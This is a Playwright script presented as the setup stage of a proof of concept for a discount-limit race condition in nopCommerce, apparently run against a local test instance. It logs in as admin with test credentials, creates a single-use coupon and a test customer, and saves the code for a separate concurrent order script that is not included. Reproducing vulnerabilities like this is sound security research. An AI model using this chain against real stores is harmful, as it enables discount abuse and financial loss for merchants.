/**
 * PoC: nopCommerce Discount Race Condition Vulnerability
 *
 * Vulnerability: TOCTOU Race Condition in Discount Usage Limit
 * Target: http://localhost:8080
 *
 * This script demonstrates the race condition between:
 * 1. DiscountService.cs:556 - Checking discount usage count
 * 2. OrderProcessingService.cs:1440 - Recording discount usage history
 */

const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');

const BASE_URL = 'http://localhost:8080';
const ADMIN_EMAIL = 'admin@yourStore.com';
const ADMIN_PASSWORD = 'Admin123!';
const SCREENSHOT_DIR = '/home/clouditera/漏洞研判复现/test/screenshots';

// Ensure screenshot directory exists
if (!fs.existsSync(SCREENSHOT_DIR)) {
    fs.mkdirSync(SCREENSHOT_DIR, { recursive: true });
}

async function takeScreenshot(page, name) {
    const filepath = path.join(SCREENSHOT_DIR, `${name}.png`);
    await page.screenshot({ path: filepath, fullPage: true });
    console.log(`[Screenshot] ${filepath}`);
    return filepath;
}

async function adminLogin(page) {
    console.log('[Step 1] Admin Login...');

    // First try direct admin login
    await page.goto(`${BASE_URL}/Admin`);
    await page.waitForLoadState('networkidle');
    await takeScreenshot(page, '01_admin_redirect');

    // Check if we're on the login page
    const currentUrl = page.url();
    console.log(`[*] Current URL: ${currentUrl}`);

    // Fill login credentials
    const emailInput = await page.locator('input#Email, input[name="Email"]').first();
    const passwordInput = await page.locator('input#Password, input[name="Password"]').first();

    if (await emailInput.count() > 0) {
        await emailInput.fill(ADMIN_EMAIL);
        await passwordInput.fill(ADMIN_PASSWORD);
        await takeScreenshot(page, '02_credentials_filled');

        // Click login button
        const loginBtn = await page.locator('button.login-button, button[type="submit"], input[type="submit"]').first();
        await loginBtn.click();
        await page.waitForLoadState('networkidle');
        await page.waitForTimeout(2000);
    }

    // Check current state
    const newUrl = page.url();
    console.log(`[*] After login URL: ${newUrl}`);
    await takeScreenshot(page, '03_after_login');

    // Try to navigate to admin
    if (!newUrl.includes('/Admin')) {
        await page.goto(`${BASE_URL}/Admin`);
        await page.waitForLoadState('networkidle');
        await page.waitForTimeout(2000);
    }

    const finalUrl = page.url();
    console.log(`[*] Final URL: ${finalUrl}`);
    await takeScreenshot(page, '04_admin_page');

    if (finalUrl.includes('/Admin') && !finalUrl.includes('login')) {
        console.log('[+] Admin login successful');
        return true;
    } else {
        console.log('[-] Admin login failed - checking page content');
        const pageContent = await page.content();
        if (pageContent.includes('Dashboard') || pageContent.includes('Admin')) {
            console.log('[+] Admin access confirmed via page content');
            return true;
        }
        return false;
    }
}

async function createLimitedDiscount(page) {
    console.log('[Step 2] Creating limited discount...');

    // Navigate to Discounts page
    await page.goto(`${BASE_URL}/Admin/Discount/List`);
    await page.waitForLoadState('networkidle');
    await takeScreenshot(page, '04_discount_list');

    // Click "Add new" button
    await page.click('a[href*="/Admin/Discount/Create"]');
    await page.waitForLoadState('networkidle');
    await takeScreenshot(page, '05_create_discount_page');

    // Generate unique discount code
    const discountCode = `RACE_TEST_${Date.now()}`;

    // Fill discount details
    await page.fill('input#Name', 'Race Condition Test Discount');

    // Select discount type - "Assigned to order total"
    await page.selectOption('select#DiscountTypeId', '1');

    // Use percentage
    await page.check('input#UsePercentage');
    await page.fill('input#DiscountPercentage', '10');

    // Requires coupon code
    await page.check('input#RequiresCouponCode');
    await page.fill('input#CouponCode', discountCode);

    // Set limitation - N times only
    await page.selectOption('select#DiscountLimitationId', '15'); // NTimesOnly
    await page.fill('input#LimitationTimes', '1');

    await takeScreenshot(page, '06_discount_form_filled');

    // Save the discount
    await page.click('button[name="save"]');
    await page.waitForLoadState('networkidle');

    // Check for success
    const successAlert = await page.locator('.alert-success').count();
    if (successAlert > 0) {
        console.log(`[+] Discount created successfully: ${discountCode}`);
        await takeScreenshot(page, '07_discount_created');
        return discountCode;
    } else {
        console.log('[-] Failed to create discount');
        await takeScreenshot(page, '07_discount_creation_failed');
        return null;
    }
}

async function getDiscountUsageCount(page, discountCode) {
    console.log('[Step] Checking discount usage history...');

    // Navigate to discount list and search
    await page.goto(`${BASE_URL}/Admin/Discount/List`);
    await page.waitForLoadState('networkidle');

    // Search for our discount
    await page.fill('input#SearchDiscountCouponCode', discountCode);
    await page.click('button#search-discounts');
    await page.waitForLoadState('networkidle');

    // Click on the discount to view details
    const discountRow = await page.locator('table#discounts-grid tbody tr').first();
    await discountRow.click();
    await page.waitForLoadState('networkidle');

    // Navigate to Usage History tab
    await page.click('a[data-tab-name="tab-usage-history"]');
    await page.waitForLoadState('networkidle');
    await takeScreenshot(page, '08_usage_history');

    // Count usage records
    const usageCount = await page.locator('table#discountusagehistory-grid tbody tr').count();
    console.log(`[*] Discount usage count: ${usageCount}`);

    return usageCount;
}

async function setupTestUser(page) {
    console.log('[Step 3] Setting up test user...');

    // Check if test user exists or create one
    await page.goto(`${BASE_URL}/Admin/Customer/List`);
    await page.waitForLoadState('networkidle');

    // Search for test user
    await page.fill('input#SearchEmail', 'testuser@test.com');
    await page.click('button#search-customers');
    await page.waitForLoadState('networkidle');

    const customerExists = await page.locator('table#customers-grid tbody tr td:has-text("testuser@test.com")').count();

    if (customerExists > 0) {
        console.log('[*] Test user already exists');
        return 'testuser@test.com';
    }

    // Create new customer
    await page.click('a[href*="/Admin/Customer/Create"]');
    await page.waitForLoadState('networkidle');

    await page.fill('input#Email', 'testuser@test.com');
    await page.fill('input#Password', 'Test123!');
    await page.check('input#Active');

    // Assign to Registered role
    await page.click('.customer-roles-selector');
    await page.check('input[data-role-name="Registered"]');

    await page.click('button[name="save"]');
    await page.waitForLoadState('networkidle');

    console.log('[+] Test user created');
    await takeScreenshot(page, '09_test_user_created');

    return 'testuser@test.com';
}

async function addProductToCart(page, userSession) {
    console.log('[Step 4] Adding product to cart...');

    // Go to homepage and find a product
    await page.goto(BASE_URL);
    await page.waitForLoadState('networkidle');

    // Click on first available product
    const productLink = await page.locator('.product-item .product-title a').first();
    if (await productLink.count() > 0) {
        await productLink.click();
        await page.waitForLoadState('networkidle');

        // Add to cart
        await page.click('button.add-to-cart-button');
        await page.waitForLoadState('networkidle');

        console.log('[+] Product added to cart');
        await takeScreenshot(page, '10_product_in_cart');
        return true;
    }

    console.log('[-] No products available');
    return false;
}

async function main() {
    console.log('='.repeat(60));
    console.log('nopCommerce Discount Race Condition PoC');
    console.log('='.repeat(60));

    const browser = await chromium.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });

    const context = await browser.newContext({
        viewport: { width: 1920, height: 1080 }
    });

    const page = await context.newPage();

    try {
        // Step 1: Admin login
        const loginSuccess = await adminLogin(page);
        if (!loginSuccess) {
            throw new Error('Admin login failed');
        }

        // Step 2: Create limited discount
        const discountCode = await createLimitedDiscount(page);
        if (!discountCode) {
            throw new Error('Failed to create discount');
        }

        // Step 3: Setup test user
        const testUser = await setupTestUser(page);

        // Step 4: Check initial usage count
        const initialUsage = await getDiscountUsageCount(page, discountCode);
        console.log(`[*] Initial usage count: ${initialUsage}`);

        // Output discount code for concurrent testing
        console.log('\n' + '='.repeat(60));
        console.log('DISCOUNT CODE FOR CONCURRENT TESTING:');
        console.log(`  Code: ${discountCode}`);
        console.log(`  Limit: 1 time total`);
        console.log('='.repeat(60));

        // Save discount code to file for concurrent script
        fs.writeFileSync('/home/clouditera/漏洞研判复现/test/discount_code.txt', discountCode);

        console.log('\n[*] Now run the concurrent order script to test race condition');

    } catch (error) {
        console.error(`[ERROR] ${error.message}`);
        await takeScreenshot(page, 'error_state');
    } finally {
        await browser.close();
    }
}

main().catch(console.error);
